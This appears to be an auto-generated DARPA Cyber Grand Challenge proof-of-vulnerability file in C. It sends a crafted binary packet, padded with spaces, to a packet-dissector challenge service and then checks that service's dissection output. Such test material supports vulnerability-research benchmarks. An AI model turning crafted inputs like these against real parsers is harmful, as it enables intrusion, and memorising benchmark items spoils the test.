#include "libpov.h"
int main(int cgc_argc, char *cgc_argv[]) {
   cgc_negotiate_type1(0x0, 0x0, 0);
   do {
      //*** writing data
      static unsigned char write_00000_00000[] = 
         "\x04\x04\x00\x00";
      static unsigned int write_00000_00000_len = 4;
      unsigned char *write_00000 = NULL;
      unsigned int write_00000_len = 0;
      write_00000 = cgc_append_buf(write_00000, &write_00000_len, write_00000_00000, write_00000_00000_len);
      if (write_00000_len > 0) {
         cgc_transmit_all(1, write_00000, write_00000_len);
      }
      cgc_free(write_00000);
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00001_00000[] = 
         "\x01\x00\x00\x00\x00\x00\x00\x00\xf0\x03\x00\x00\xe8\x03\x00\x00"
         "\x00\x00\x00\x00\x00\x00\x00\x00\xe8\x03\x00\x00\xe5\x4a\xd9\x09"
         "\xd4\xc0\x2f\x20\x73\x90\x21\x0e\x2f\x69\xcb\xc3\xcd\x08\x2b\xeb"
         "\xcd\x00\x00\x00\x02\xd4\x7d\x96\x4e\xd1\xf8\x01\xaa\xfd\x4b\xff"
         "\xf8\xaf\x2f\xc4\x56\x10\xf0\x0b\xc2\xef\x9f\x59\x7b\x67\xde\xb7"
         "\xd9\x9c\x26\xac\x15\x98\x14\x1d\x17\x23\x22\x13\xf1\x3f\x2c\x4d"
         "\x9b\x1b\x30\x6b\x76\x69\xa3\x26\x04\xed\x02\x91\x93\x49\x54\x69"
         "\x7c\x84\x7b\xd8\xd2\xac\x7b\x82\x32\xc4\x78\xa2\xe4\xb2\x95\x40"
         "\x35\x76\x54\xa4\x1e\x24\x32\x49\x4a\x4c\x35\x67\xbc\x73\x70\x73"
         "\xd1\x4f\x0d\x26\x7b\x8b\xe9\xc4\x78\x3e\x2f\xe5\x6b\x81\x89\x2d"
         "\xe0\x4c\x2e\x9c\xde\x1e\x63\x76\xa6\xa2\x02\xbc\x96\xbe\xa9\x86"
         "\xbb\x76\xc9\x7d\x18\x17\x7b\x5e\xd5\xea\x15\x01\xe1\x37\x27\x9b"
         "\x0a\x33\x63\xd6\x29\x27\x94\xfd\x08\x0d\xf3\x7d\xc9\x2e\xb8\x2b"
         "\x95\x60\xc0\xe4\xc9\xfb\x19\x3c\x46\x62\xe6\xc7\xfd\x91\x5d\x9d"
         "\x58\x89\x30\xa6\x86\x23\xfa\xd8\xa3\xf9\xe6\x0b\xe8\x80\x27\x4d"
         "\x12\xf2\x1c\x19\x9c\x6b\x73\x72\x92\xa7\x87\x8a\xf0\xd2\xa4\x6a"
         "\x67\xf5\x32\xbe\x38\xf4\xc7\x95\x40\x42\xe8\xb4\xcd\xb6\x3e\x54"
         "\xdd\xfe\xb9\x3f\x7b\x57\xa2\x4b\x42\x69\x6c\xfc\x1b\xca\xed\x23"
         "\xf8\xdd\xc4\x55\x41\x6b\xee\xdb\x6f\xce\xe0\x83\xb2\xdc\xa7\x62"
         "\x3e\x01\xae\x90\x27\xe9\x59\x9a\x9b\xe2\x9f\x00\x60\x11\x30\xc0"
         "\xd4\x9d\x14\x54\x78\xc6\x61\xfd\xb3\x7d\x7a\x5b\xba\x3f\xf1\xe7"
         "\xd0\x78\x96\xa5\xd7\x07\x11\x96\xfb\xa9\xa9\x89\x40\x9b\x9f\x1d"
         "\x50\x78\x29\x5d\xa7\x49\x0b\x8c\x5e\x30\xe1\xd3\xc9\x30\x0f\xf3"
         "\x9f\x98\x76\xc2\x62\xd4\x0a\x8b\x04\x38\x29\x29\xa2\xe0\xef\xc6"
         "\xa5\xff\xca\x20\x0d\xfd\xdd\xa5\x4c\x89\xca\x6c\x51\xb0\x4a\x03"
         "\x6f\xc5\x7a\xd8\x51\x7d\x44\x98\x36\x5f\x11\xdd\xc5\x6a\xe8\xc1"
         "\x81\x4d\x73\x33\xa4\x2c\x36\x2e\x8f\xc1\xc8\x8c\x82\xdf\xe3\xe0"
         "\x45\xfb\x55\xfa\xc9\xd0\xfd\xb5\x4f\x12\xf0\x47\x07\x92\xb9\xde"
         "\x9e\x3a\x61\x0b\xb6\x6b\x64\x28\x93\x32\xda\xe9\xb7\x0b\xcf\x1e"
         "\x92\xcf\xe7\x3f\x65\xfd\xc4\x9d\x7c\x29\x8d\xe3\xec\xa4\x4f\x3a"
         "\x23\x6e\xee\xc4\x10\xaf\xf4\x80\x6e\x38\x62\x7f\xc8\x6a\x14\xab"
         "\xa3\x36\xaf\x82\xcb\xf0\xff\x69\xe1\x64\xa6\xc7\x51\x4a\xda\x43"
         "\x58\x00\xd1\x46\xf2\xe3\x55\x91\x9c\xd5\x5b\x16\xb1\x67\x84\xf8"
         "\x78\xe1\x96\xd5\xa2\x2c\x63\xbd\x29\xa2\x5b\xb6\x4e\xd3\xc9\x7d"
         "\x70\xed\xe1\x69\x09\x87\xa6\x92\xc1\xfb\x6a\x93\x91\x17\x93\xb6"
         "\xa6\x63\x7c\xd8\x2f\x07\x44\xa7\xed\x5e\xf9\xcf\x69\x54\xa6\xc3"
         "\x63\x00\xbf\x38\x82\x68\xa9\xdf\xf1\xea\xdf\x49\xe1\x89\xf2\xac"
         "\x2b\xed\x86\xb8\x33\x7b\xf9\x4a\x2d\x99\xff\x84\xfb\xd1\x46\x85"
         "\x21\xac\x1d\xfb\x84\x04\xf3\xb8\x6d\x17\x2b\x58\xd8\x09\xcc\x27"
         "\xce\x0c\x9d\x6a\x56\x46\xba\xd3\xa3\x3a\x6a\xbf\x4a\x6c\xef\xfb"
         "\xd3\x35\x6a\xb6\x17\xb4\x59\xaa\xfb\x10\xef\x5c\x2a\x96\x28\x4f"
         "\x1d\x0a\xc1\x9b\xa2\xe0\xb4\xb9\x46\x81\xac\xf4\x36\xa6\x45\x57"
         "\xb2\x6a\xf2\x11\x30\xc0\xc7\xc9\xd5\x79\x3e\x08\xf8\xa8\x7d\xda"
         "\xfa\x9a\x0f\x59\x44\xcf\x88\x41\xac\xc7\x57\x63\x8f\xcd\xf5\x12"
         "\x64\x06\x7b\x5e\x51\xb8\xe7\xe4\xe7\x26\x5a\xc6\xd6\x09\xd3\x9b"
         "\xea\xe7\xc0\xb3\x10\x68\x31\x31\x05\xea\xfc\x6f\x8f\xc3\x2c\x29"
         "\x90\x41\x72\xa8\x58\xd9\x35\x05\x60\x35\xda\x6d\x99\xe4\xe6\x8c"
         "\xf7\x9f\xbf\xa3\x67\x7e\xd3\x08\x0d\x55\x8d\x46\xd2\xbe\xeb\x4d"
         "\xc8\xcc\xc3\x09\x35\xfd\xf9\xe7\xb5\xe8\x3a\x1c\xdf\x0f\x7f\xba"
         "\xb5\x60\x7c\x9e\x03\x37\xfa\xff\xcd\xad\x37\xa9\xa2\xb8\x6d\x00"
         "\x6b\x3e\x04\x4b\x1e\x56\x1e\x26\x93\xae\x5c\x8b\x8b\xc2\x01\xa2"
         "\x38\x8f\xb2\x3f\x0b\xd0\x7d\x47\x8b\x63\xf2\x76\x70\x17\x62\xc7"
         "\x65\x0b\x96\x0f\x4a\x81\x18\xa1\x85\x17\xb2\x5a\x2d\x38\x92\xb9"
         "\x00\xcf\xdf\x0b\x00\x45\x9e\xad\x0e\xf0\xac\xa4\x88\x6d\x71\x9f"
         "\x70\xbb\xca\xf8\x7a\x6e\x3f\x49\xe1\xd6\x6d\x19\x47\x52\x8d\x5f"
         "\x66\x0b\x00\xcb\x4b\xce\xea\x51\x98\xc4\x44\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20";
      static unsigned int write_00001_00000_len = 1028;
      unsigned char *write_00001 = NULL;
      unsigned int write_00001_len = 0;
      write_00001 = cgc_append_buf(write_00001, &write_00001_len, write_00001_00000, write_00001_00000_len);
      if (write_00001_len > 0) {
         cgc_transmit_all(1, write_00001, write_00001_len);
      }
      cgc_free(write_00001);
   } while (0);
   do {
      unsigned char *read_00000;
      unsigned int read_00000_len;
      unsigned int read_00000_ptr = 0;
      //**** delimited read
      static unsigned char read_00000_delim[] = 
         "\x0a";
      read_00000 = NULL;
      read_00000_len = 0;
      int read_00000_res = cgc_delimited_read(0, &read_00000, &read_00000_len, read_00000_delim, 1);
      if (read_00000_res) {} //silence unused variable warning
      //**** read match data
      static unsigned char match_00000_00000[] = 
         "\x53\x74\x61\x72\x74\x69\x6e\x67\x20\x64\x69\x73\x73\x65\x63\x74"
         "\x69\x6f\x6e\x2e\x2e\x2e";
      read_00000_ptr += cgc_data_match(read_00000 + read_00000_ptr, read_00000_len - read_00000_ptr, match_00000_00000, 22);
      cgc_free(read_00000);
      if (read_00000_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      unsigned char *read_00001;
      unsigned int read_00001_len;
      unsigned int read_00001_ptr = 0;
      //**** delimited read
      static unsigned char read_00001_delim[] = 
         "\x3d\x3d\x3d\x3d\x0a";
      read_00001 = NULL;
      read_00001_len = 0;
      int read_00001_res = cgc_delimited_read(0, &read_00001, &read_00001_len, read_00001_delim, 5);
      if (read_00001_res) {} //silence unused variable warning
      /* read match pcre:
.*New Packet
*/
      static char read_00001_00000_regex[] = 
         "\x2e\x2a\x4e\x65\x77\x20\x50\x61\x63\x6b\x65\x74";
      static match_result read_00001_00000_match;
      pcre *read_00001_00000_pcre = cgc_init_regex(read_00001_00000_regex);
      if (read_00001_00000_pcre != NULL) {
         int rc = cgc_regex_match(read_00001_00000_pcre, 0, read_00001 + read_00001_ptr, read_00001_len - read_00001_ptr, &read_00001_00000_match);
         if (rc > 0) {
            read_00001_ptr += read_00001_00000_match.match_end - read_00001_00000_match.match_start;
         }
         else {
            //this is a pov so what does this even mean?
            //why would we quit on failed match, just keep sending stuff.
         }
         pcre_free(read_00001_00000_pcre);
      }
      else {
         //this is a pov so what does this even mean?
         //why would we quit on failed regex compile, just keep sending stuff.
      }
      cgc_free(read_00001);
      if (read_00001_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      unsigned char *read_00002;
      unsigned int read_00002_len;
      unsigned int read_00002_ptr = 0;
      //**** delimited read
      static unsigned char read_00002_delim[] = 
         "\x3d\x3d\x3d\x0a";
      read_00002 = NULL;
      read_00002_len = 0;
      int read_00002_res = cgc_delimited_read(0, &read_00002, &read_00002_len, read_00002_delim, 4);
      if (read_00002_res) {} //silence unused variable warning
      /* read match pcre:
.*===rofl
*/
      static char read_00002_00000_regex[] = 
         "\x2e\x2a\x3d\x3d\x3d\x72\x6f\x66\x6c";
      static match_result read_00002_00000_match;
      pcre *read_00002_00000_pcre = cgc_init_regex(read_00002_00000_regex);
      if (read_00002_00000_pcre != NULL) {
         int rc = cgc_regex_match(read_00002_00000_pcre, 0, read_00002 + read_00002_ptr, read_00002_len - read_00002_ptr, &read_00002_00000_match);
         if (rc > 0) {
            read_00002_ptr += read_00002_00000_match.match_end - read_00002_00000_match.match_start;
         }
         else {
            //this is a pov so what does this even mean?
            //why would we quit on failed match, just keep sending stuff.
         }
         pcre_free(read_00002_00000_pcre);
      }
      else {
         //this is a pov so what does this even mean?
         //why would we quit on failed regex compile, just keep sending stuff.
      }
      cgc_free(read_00002);
      if (read_00002_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      unsigned char *read_00003;
      unsigned int read_00003_len;
      unsigned int read_00003_ptr = 0;
      //**** delimited read
      static unsigned char read_00003_delim[] = 
         "\x3d\x3d\x3d\x0a";
      read_00003 = NULL;
      read_00003_len = 0;
      int read_00003_res = cgc_delimited_read(0, &read_00003, &read_00003_len, read_00003_delim, 4);
      if (read_00003_res) {} //silence unused variable warning
      /* read match pcre:
.*===fetoracclimatement
*/
      static char read_00003_00000_regex[] = 
         "\x2e\x2a\x3d\x3d\x3d\x66\x65\x74\x6f\x72\x61\x63\x63\x6c\x69\x6d"
         "\x61\x74\x65\x6d\x65\x6e\x74";
      static match_result read_00003_00000_match;
      pcre *read_00003_00000_pcre = cgc_init_regex(read_00003_00000_regex);
      if (read_00003_00000_pcre != NULL) {
         int rc = cgc_regex_match(read_00003_00000_pcre, 0, read_00003 + read_00003_ptr, read_00003_len - read_00003_ptr, &read_00003_00000_match);
         if (rc > 0) {
            read_00003_ptr += read_00003_00000_match.match_end - read_00003_00000_match.match_start;
         }
         else {
            //this is a pov so what does this even mean?
            //why would we quit on failed match, just keep sending stuff.
         }
         pcre_free(read_00003_00000_pcre);
      }
      else {
         //this is a pov so what does this even mean?
         //why would we quit on failed regex compile, just keep sending stuff.
      }
      cgc_free(read_00003);
      if (read_00003_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      unsigned char *read_00004;
      unsigned int read_00004_len;
      unsigned int read_00004_ptr = 0;
      //**** delimited read
      static unsigned char read_00004_delim[] = 
         "\x3d\x3d\x3d\x0a";
      read_00004 = NULL;
      read_00004_len = 0;
      int read_00004_res = cgc_delimited_read(0, &read_00004, &read_00004_len, read_00004_delim, 4);
      if (read_00004_res) {} //silence unused variable warning
      /* read match pcre:
.*Dissection finished
*/
      static char read_00004_00000_regex[] = 
         "\x2e\x2a\x44\x69\x73\x73\x65\x63\x74\x69\x6f\x6e\x20\x66\x69\x6e"
         "\x69\x73\x68\x65\x64";
      static match_result read_00004_00000_match;
      pcre *read_00004_00000_pcre = cgc_init_regex(read_00004_00000_regex);
      if (read_00004_00000_pcre != NULL) {
         int rc = cgc_regex_match(read_00004_00000_pcre, 0, read_00004 + read_00004_ptr, read_00004_len - read_00004_ptr, &read_00004_00000_match);
         if (rc > 0) {
            read_00004_ptr += read_00004_00000_match.match_end - read_00004_00000_match.match_start;
         }
         else {
            //this is a pov so what does this even mean?
            //why would we quit on failed match, just keep sending stuff.
         }
         pcre_free(read_00004_00000_pcre);
      }
      else {
         //this is a pov so what does this even mean?
         //why would we quit on failed regex compile, just keep sending stuff.
      }
      cgc_free(read_00004);
      if (read_00004_ptr) {}  //silence unused variable warning if any
   } while (0);
}
